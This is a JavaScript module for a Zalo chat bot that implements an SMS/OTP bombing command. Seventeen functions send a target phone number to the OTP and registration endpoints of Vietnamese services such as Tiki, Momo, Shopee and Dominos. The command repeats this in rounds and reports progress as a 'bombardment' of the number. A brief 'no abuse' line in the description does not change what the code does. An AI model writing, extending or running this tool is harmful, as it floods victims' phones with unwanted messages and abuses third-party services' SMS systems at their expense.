import axios from "axios";
import { log } from "../logger.js";

export const name = "spamsms";
export const version = "2.0.0";
export const credits = "LocDev & Gemini";
export const description = "Spam SMS/OTP đến số điện thoại qua nhiều dịch vụ (Nghiêm cấm lạm dụng phá hoại)";

// Tất cả các hàm gửi OTP (đã tối ưu cho Zalo Bot)
async function sendOTP_Baemin(phone) { try { await axios.post('https://www.baemin.vn/api/auth/send-otp', { phone }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_Sapo(phone) { try { await axios.post('https://www.sapo.vn/fnb/sendotp', new URLSearchParams({ phonenumber: phone }), { timeout: 5000 }); } catch (e) {} }
async function sendOTP_TV360(phone) { try { await axios.post('https://tv360.vn/public/v1/auth/get-otp-login', { msisdn: phone }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_Tiki(phone) { try { await axios.post('https://tiki.vn/api/v2/users/otp/send', { phone }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_Momo(phone) { try { await axios.post('https://api.momo.vn/api/user/otp', { phoneNumber: phone }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_Gumac(phone) { try { await axios.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', { phone }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_Vieon(phone) { try { await axios.post('https://api.vieon.vn/backend/user/v2/register', { username: phone, country_code: 'VN' }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_LotteMart(phone) { try { await axios.post('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', { username: phone, case: 'register' }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_Shopee(phone) { try { await axios.post('https://shopee.vn/api/v4/otp/get_settings_v2', { operation: 8, phone: phone }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_Ahamove(phone) { try { await axios.post('https://api.ahamove.com/api/v3/public/user/login', { mobile: phone, country_code: 'VN', firebase_sms_auth: true }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_Dominos(phone) { try { await axios.post('https://dominos.vn/api/v1/users/send-otp', { phone_number: phone, type: 0, is_register: true }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_NhaThuocLongChau(phone) { try { await axios.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', { phoneNumber: phone, otpType: 0, fromSys: 'WEBKHLC' }, { timeout: 5000 }); } catch (e) {} }
async function sendOTP_GalaxyPlay(phone) { try { await axios.post('https://api.glxplay.io/account/phone/checkPhoneOnly', null, { params: { phone }, timeout: 5000 }); } catch (e) {} }
async function sendOTP_Fahasa(phone) { try { await axios.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', new URLSearchParams({ phone }), { timeout: 5000 }); } catch (e) {} }
async function sendOTP_HoangPhuc(phone) { try { await axios.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', new URLSearchParams({ action_type: '1', tel: phone }), { timeout: 5000 }); } catch (e) {} }
async function sendOTP_Routine(phone) { try { await axios.post('https://routine.vn/customer/otp/send/', new URLSearchParams({ telephone: phone, isForgotPassword: '0' }), { timeout: 5000 }); } catch (e) {} }
async function sendOTP_WinMart(phone) { try { await axios.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', { phoneNumber: phone, gender: 'Male' }, { timeout: 5000 }); } catch (e) {} }

const allOTPFunctions = [
    sendOTP_Baemin, sendOTP_Sapo, sendOTP_TV360, sendOTP_Tiki, sendOTP_Momo,
    sendOTP_Gumac, sendOTP_Vieon, sendOTP_LotteMart, sendOTP_Shopee,
    sendOTP_Ahamove, sendOTP_Dominos, sendOTP_NhaThuocLongChau,
    sendOTP_GalaxyPlay, sendOTP_Fahasa, sendOTP_HoangPhuc,
    sendOTP_Routine, sendOTP_WinMart
];

const personaName = "『 🎀 Bé Hân ✨ 』: ";

export const commands = {
    spamsms: async (ctx) => {
        const { api, threadId, threadType, args, senderId, senderName, isOwner } = ctx;

        if (!isOwner) {
            return api.sendMessage({ msg: "➜ ❌ Quyền hạn không đủ." }, threadId, threadType);
        }

        if (args.length < 2) {
            return api.sendMessage({ msg: "➜ ⚠️ Cú pháp: spamsms [SĐT] [Số lần]" }, threadId, threadType);
        }

        const phone = args[0];
        const count = parseInt(args[1]) || 1;

        if (isNaN(count) || count < 1 || count > 20) {
            return api.sendMessage({ msg: "➜ ❌ Số lần spam không hợp lệ (1-20)." }, threadId, threadType);
        }

        await api.sendMessage({
            msg: `➜ 🛡️ Bắt đầu tiến trình oanh tạc: ${phone} (${count} lượt)...`,
        }, threadId, threadType);

        for (let i = 1; i <= count; i++) {
            try {
                const promises = allOTPFunctions.map(fn => fn(phone));
                await Promise.allSettled(promises);
                
                if (i % 5 === 0) {
                    api.sendMessage({ msg: `➜ 📊 Tiến độ: ${i}/${count}...` }, threadId, threadType);
                }
            } catch (err) {
                log.error(`Lỗi Spam lượt ${i}: ${err.message}`);
            }

            if (i < count) {
                await new Promise(resolve => setTimeout(resolve, 3000));
            }
        }

        return api.sendMessage({
            msg: `➜ ✅ Hoàn thành oanh tạc số ${phone}!`
        }, threadId, threadType);
    }
};
